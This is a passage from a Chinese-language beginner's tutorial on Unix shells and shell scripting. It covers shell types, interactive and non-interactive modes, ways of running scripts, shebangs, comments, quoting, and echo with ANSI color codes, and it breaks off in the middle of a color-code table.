itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Shell入门指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4365493763322599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    lihouyi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T01:42:29.000Z" title="Wed Jan 14 2026 01:42:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Shell入门指南</h2>
<pre><code class="hljs">███████╗██╗  ██╗███████╗██╗     ██╗
██╔════╝██║  ██║██╔════╝██║     ██║
███████╗███████║█████╗  ██║     ██║
╚════██║██╔══██║██╔══╝  ██║     ██║
███████║██║  ██║███████╗███████╗███████╗
</code></pre>
<h3 data-id="heading-1">Shell简介</h3>
<h4 data-id="heading-2">shell</h4>
<p>Shell 本质上是一个用 C 语言编写的程序，它是连接用户与 Linux/Unix 操作系统内核的<strong>核心桥梁</strong>。对于开发者而言，Shell 具有不可替代的“双重人格”：</p>
<ul>
<li>作为<code>命令语言解释器</code>：它为用户提供了访问操作系统内核服务的交互界面。当你输入命令（如 ls, grep）时，Shell 负责解释这些指令并传递给内核执行</li>
<li>作为<code>程序设计语言</code>：Shell 拥有一套完整的编程语法（变量、循环、条件判断等）。我们将由 Shell 语法编写的程序称为<code>Shell Script</code>，这也是我们在开发和运维中常说的“写 Shell”</li>
</ul>



































<table><thead><tr><th/><th>Shell</th><th>Shell Script</th></tr></thead><tbody><tr><td><strong>本质</strong></td><td>命令解释器 / 运行环境</td><td>文本文件 / 逻辑代码集合</td></tr><tr><td><strong>核心职责</strong></td><td>接收指令、调用内核、反馈结果</td><td>编排指令、处理逻辑、实现自动化</td></tr><tr><td><strong>交互模式</strong></td><td>实时交互（Read-Eval-Print Loop）</td><td>批处理执行（编写 -&gt; 运行）</td></tr><tr><td><strong>示例</strong></td><td><code>bash</code>、<code>zsh</code>、<code>sh</code></td><td><code>install.sh</code>、<code>backup.sh</code></td></tr><tr><td><strong>依赖关系</strong></td><td>脚本运行的<strong>宿主/解释器</strong></td><td>Shell 能力的<strong>扩展/载体</strong></td></tr></tbody></table>
<h4 data-id="heading-3">Shell环境</h4>
<p>Shell 环境并非单纯的一个“黑色窗口”，它是操作系统为用户分配的一个<strong>运行时上下文 (Runtime Context)</strong>。这个上下文决定了命令如何被解析、资源如何被分配以及进程如何被管理</p>
<p>一个完整的 Shell 运行环境通常由以下核心模块构成：</p>
<ul>
<li><code>命令解释器</code>：负责解析和执行用户输入的命令</li>
<li><code>环境变量</code>：定义系统运行时行为的全局键值对，决定了命令搜索路径、用户身份及语言环境等</li>
<li><code>配置文件</code>：控制 Shell 启动时的初始化行为，分为“登录/非登录”和“交互/非交互”加载模式</li>
<li><code>用户自定义</code>：包括别名alias、函数和快捷方式</li>
</ul>
<p>编写 Shell 脚本并不需要特殊的 IDE，任何文本编辑器（Vim/VSCode）配合一个解释器即可。虽然 Linux 系统中存在多种 Shell，但主流阵营主要分为四大类：</p>






























<table><thead><tr><th>Shell</th><th>全称</th><th>特点</th></tr></thead><tbody><tr><td>sh</td><td>Bourne Shell</td><td>Unix 标准默认 shell，<strong>遵循 POSIX 标准</strong>，兼容性好，基础广泛</td></tr><tr><td><code>bash</code></td><td>Bourne Again Shell</td><td>Linux 标准默认 shell，功能丰富，兼容 sh，支持脚本编程</td></tr><tr><td>fish</td><td>Friendly Interactive Shell</td><td>用户友好，智能自动补全，语法高亮，开箱即用</td></tr><tr><td>zsh</td><td>Z Shell</td><td>macOS 的默认 Shell。完全兼容 Bash，但在自动补全、主题插件（如 Oh My Zsh）方面拥有极致体验，是开发者桌面的首选</td></tr></tbody></table>
<blockquote>
<p>在大多数现代 Linux 系统（如CentOS/Ubuntu）中，<code>/bin/sh</code>往往只是一个指向<code>/bin/bash</code>的符号链接</p>
<p>当通过<code>sh script.sh</code>运行脚本时，Bash 会以<strong>POSIX 兼容模式</strong>启动，此时它会关闭部分 Bash 特有的扩展功能（如<code>[[...]]</code>条件判断），以模仿老式 Bourne Shell 的行为。这也是为什么有时候同一段脚本用 bash 跑没问题，用 sh 跑却报错的原因</p>
</blockquote>
<h4 data-id="heading-4">Shell模式</h4>
<p>Shell 的运作模式从根本上取决于其<strong>命令读取来源</strong>。根据交互形式的不同，可以划分为<code>交互模式</code>和<code>非交互模式</code></p>
<h5 data-id="heading-5">交互模式</h5>
<p>用户登录终端后的默认模式。Shell 作为一个<strong>REPL（Read-Eval-Print Loop）环境</strong>运行</p>
<ol>
<li><strong>Read</strong>：从标准输入（Stdin）等待用户键入命令</li>
<li><strong>Eval</strong>：解析并执行命令</li>
<li><strong>Print</strong>：将结果输出到终端（Stdout）</li>
<li><strong>Loop</strong>：再次显示提示符（Prompt），等待下一条指令</li>
</ol>
<p>可以将Shell的交互模式简单理解为执行命令行。以下即为处于交互模式下</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 典型的交互式提示符（PS1变量定义）</span>
user@host:~$
<span class="hljs-comment"># 此时可直接输入 ls, top, docker ps 等命令</span>
</code></pre>
<h5 data-id="heading-6">非交互模式</h5>
<p>Shell 脚本运行时的典型模式（批处理模式）。此模式下，Shell <strong>不与用户进行实时交互</strong>，而是从文件或管道中读取一系列命令</p>
<ul>
<li><code>生命周期</code>：Shell 读取文件 -&gt; 按顺序执行命令 -&gt; 执行完毕后 Shell 进程自动终止 -&gt; 控制权返回父进程</li>
</ul>
<p>编写完脚本文件（如 script.sh）后，如何运行它是很多新手容易混淆的地方。执行方式不仅决定了权限需求，更决定了代码运行的<strong>进程作用域</strong></p>
<p><strong>方式一</strong>：解释器参数执行（Fork 子进程）</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 直接调用 Shell 程序（如 bash 或 sh），将脚本路径作为参数传递</span>
bash script.sh
sh script.sh

<span class="hljs-comment"># 当前 Shell 启动一个新的 子 Shell 进程来解析脚本</span>
<span class="hljs-comment"># 脚本文件本身不需要执行权限（x），只需有读取权限（r）</span>
</code></pre>
<p><strong>方式二</strong>：直接路径执行（Fork 子进程）</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 将脚本作为可执行程序直接运行</span>
<span class="hljs-built_in">chmod</span> +x script.sh  <span class="hljs-comment"># 必须先赋予执行权限</span>
./script.sh

<span class="hljs-comment"># Shell 依然会 Fork 一个子进程。解释器由脚本第一行的 Shebang 决定</span>
<span class="hljs-comment"># 必须拥有 r 和 x 权限</span>
</code></pre>
<p><strong>方式三</strong>：Sourcing 执行（当前进程）</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 source 或其别名 . 来加载脚本</span>
<span class="hljs-built_in">source</span> script.sh
<span class="hljs-comment"># 点与文件名之间有空格</span>
. script.sh

<span class="hljs-comment"># 不启动子进程，直接在当前 Shell 环境中逐行执行脚本内容</span>
<span class="hljs-comment"># 脚本内定义的变量、函数会直接“污染”当前终端环境；脚本内的 exit 命令会导致当前终端窗口直接关闭</span>
</code></pre>
<p>三种方式总结如下：</p>









































<table><thead><tr><th>方式</th><th>典型指令</th><th>进程归属</th><th>变量作用域</th><th>权限依赖</th><th>Shebang</th><th>核心用途</th></tr></thead><tbody><tr><td><strong>解释器执行</strong></td><td><code>bash file.sh</code></td><td><strong>子进程</strong></td><td>隔离（结束后释放）</td><td>读取（Read）</td><td>被忽略</td><td>临时运行、调试</td></tr><tr><td><strong>直接执行</strong></td><td><code>./file.sh</code></td><td><strong>子进程</strong></td><td>隔离（结束后释放）</td><td>读+执行 （R+X）</td><td><strong>依赖</strong></td><td>标准化脚本</td></tr><tr><td><strong>内建加载</strong></td><td><code>source file.sh</code></td><td><strong>当前进程</strong></td><td><strong>保留</strong>（污染环境）</td><td>读取（Read）</td><td>无视</td><td>环境配置、库加载</td></tr></tbody></table>
<h3 data-id="heading-7">基本语法</h3>
<h4 data-id="heading-8">解释器</h4>
<p>Shell 脚本的第一行通常包含一个特殊的字符序列<code>#!</code>，技术术语称为<strong>Shebang</strong>（或 Hashbang）。它不仅是一行注释，更是写给<strong>操作系统内核</strong>看的“指令”，告诉系统其后路径所指定的程序即是解释此脚本文件的 Shell 解释器</p>
<p>在 Shell 中，你会见到诸如以下的注释：</p>
<ul>
<li>硬编码路径</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#!/usr/bin/python</span>
</code></pre>
<p>直接指定解释器的绝对路径，但移植性差，一旦路径不匹配，脚本直接报错<code>File not found</code></p>
<ul>
<li>动态查找</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/usr/bin/env bash</span>
<span class="hljs-comment">#!/usr/bin/env python3</span>
</code></pre>
<p><code>env</code>会根据当前用户的环境变量<code>PATH</code>，自动查找第一个匹配的程序，此种方式最为推荐</p>
<h4 data-id="heading-9">注释</h4>
<p>各种语言都有对应的注释语法，Shell语法中，注释是特殊的语句，会被Shell解释器忽略</p>
<ul>
<li>单行注释：以<code>#</code>开头，到行尾结束</li>
<li>多行注释：以<code>:&lt;&lt;EOF</code>开头，到<code>EOF</code>结束</li>
</ul>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'这是单行注释'</span></span>

:&lt;&lt;EOF
echo '这是多行注释'
echo '这是多行注释'
echo '这是多行注释'
EOF
</code></pre>
<h4 data-id="heading-10">引号</h4>





















<table><thead><tr><th>引号</th><th>含义</th></tr></thead><tbody><tr><td>单引号</td><td>所见即所得，单引号里面内容原封不动输出</td></tr><tr><td>双引号</td><td>双引号内的字符串会进行<strong>变量替换</strong>和<strong>转义处理</strong> ，但不会执行命令替换，不解析{}和通配符</td></tr><tr><td>反引号</td><td>优先执行，先执行反引号里面的命令，会进行命令替换</td></tr></tbody></table>
<p>在双引号中，变量引用或者命令置换是会被展开的。在单引号中不会</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">"Your home: <span class="hljs-variable">$HOME</span>"</span> <span class="hljs-comment"># Your home: /Users/&lt;username&gt;</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">'Your home: $HOME'</span> <span class="hljs-comment"># Your home: $HOME</span>
</code></pre>
<p>当局部变量和环境变量包含空格时，它们在引号中的扩展要格外注意</p>
<pre><code class="hljs language-bash" lang="bash">INPUT=<span class="hljs-string">"A string  with   strange    whitespace."</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$INPUT</span>   <span class="hljs-comment"># A string with strange whitespace.</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$INPUT</span>"</span> <span class="hljs-comment"># A string  with   strange    whitespace.</span>
</code></pre>
<h4 data-id="heading-11">echo</h4>
<h5 data-id="heading-12">基本使用</h5>
<p><code>echo</code>用于在shell中打印shell变量的值，或者直接输出指定的字符串，在shell编程中极为常用</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> [Option] [String]

-e：启用转义字符
-E：不启用转义字符（默认）
-n：结尾不换行，默认情况下 <span class="hljs-built_in">echo</span> 会在末尾追加一个 \n
</code></pre>
<ul>
<li>不使用转义字符</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 默认情况下，echo输出结果自带换行符\n</span>
name=world
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, world"</span> <span class="hljs-comment"># hello, world</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, \"world\""</span> <span class="hljs-comment"># hello, "world"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, \"<span class="hljs-variable">${name}</span>\""</span> <span class="hljs-comment"># hello, "world"</span>

<span class="hljs-comment"># 输出含换行符的字符串</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"YES\nNO"</span> <span class="hljs-comment"># YES\nNO</span>

<span class="hljs-comment"># 输出重定向到文件</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"test"</span> &gt; test.txt

<span class="hljs-comment"># 输出执行结果</span>
<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">pwd</span>` <span class="hljs-comment"># (当前目录路径)</span>
</code></pre>
<ul>
<li>使用转义字符</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"YES\nNO"</span> <span class="hljs-comment"># -e 开启转义</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  YES</span>
<span class="hljs-comment">#  NO</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"YES\c"</span> <span class="hljs-comment"># -e 开启转义 \c 不换行</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"NO"</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  YESNO</span>
</code></pre>
<h5 data-id="heading-13">进阶使用</h5>
<p>控制echo输出文字的颜色</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"控制序列1文本内容控制序列2"</span>

<span class="hljs-comment"># 控制序列组成</span>
\e[样式代码1;样式代码2;前景色代码;背景色代码m
</code></pre>
<p>以<code>echo -e "\e[1;31mThis is red text\e[0m"</code>为例</p>
<ul>
<li><code>\e</code>：等同于<code>\033</code>，表示 ANSI 转义字符的起始（Escape 字符）</li>
<li><code>[</code>：紧跟<code>\e</code>后，表示进入控制序列模式</li>
<li><code>1;31m</code>：1为样式代码，31为前景色代码，m表示控制序列结束</li>
<li><code>\e[0m</code>：0表示重置所有属性，m表示结束控制序列</li>
</ul>
<p>以上命令，终端会输出<strong>加粗的红色文本</strong> <code>This is red text</code>，随后颜色和样式恢复默认</p>































































































































































































<table><thead><tr><th>类型</th><th>代码</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>样式代码</td><td>0</td><td>重置所有属性（颜色、加粗、下划线等）</td><td>\e[0m</td></tr><tr><td/><td>1</td><td>加粗/高亮文本</td><td>\e[1;31m（红色加粗）</td></tr><tr><td/><td>4</td><td>下划线文本</td><td>\e[4mUnderline\e[0m</td></tr><tr><td/><td>5</td><td>闪烁文本（闪烁频率由终端决定）</td><td>\e[5;31mFlashing Red\e[0m</td></tr><tr><td/><td>7</td><td>反转颜色（交换前景色和背景色）</td><td>\e[7;30;47mInverted\e[0m</td></tr><tr><td/><td>8</td><td>隐藏文本（部分终端支持）</td><td>\e[8mHidden Text\e[0m</td></tr><tr><td/><td>22</td><td>取消加粗（恢复默认粗细）</td><td>\e[22mNormal Text\e[0m</td></tr><tr><td/><td>24</td><td>取消下划线</td><td>\e[24mNo Underline\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>前景色代码</td><td>30</td><td>黑色</td><td>\e[30mBlack Text\e[0m</td></tr><tr><td/><td>31</td><td>红色</td><td>\e[31mRed Text\e[0m</td></tr><tr><td/><td>32</td><td>绿色</td><td>\e[32mGreen Text\e[0m</td></tr><tr><td/><td>33</td><td>黄色</td><td>\e[33mYellow Text\e[0m</td></tr><tr><td/><td>34</td><td>蓝色</td><td>\e[34mBlue Text\e[0m</td></tr><tr><td/><td>35</td><td>紫色</td><td>\e[35mMagenta Text\e[0m</td></tr><tr><td/><td>36</td><td>青色</td><td>\e[36mCyan Text\e[0m</td></tr><tr><td/><td>37</td><td>白色</td><td>\e[37mWhite 